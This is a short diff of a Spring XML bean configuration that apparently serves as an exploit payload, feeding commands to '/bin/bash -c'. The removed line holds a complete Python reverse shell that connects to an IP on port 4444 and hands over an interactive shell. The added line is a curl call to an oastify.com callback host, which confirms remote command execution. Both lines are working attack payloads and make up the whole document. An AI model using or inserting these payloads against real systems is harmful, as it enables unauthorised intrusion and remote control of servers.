@@ -11,7 +11,7 @@ http://www.springframework.org/schema/context/spring-context.xsd">
 <list>
 <value>/bin/bash</value>
 <value>-c</value>
-<value>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.104.48.25",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</value>
+<value>curl h3lsh5bwsdrgghjf0z663w3ge7ky8n.oastify.com</value>
 </list>
 </constructor-arg>
 </bean>
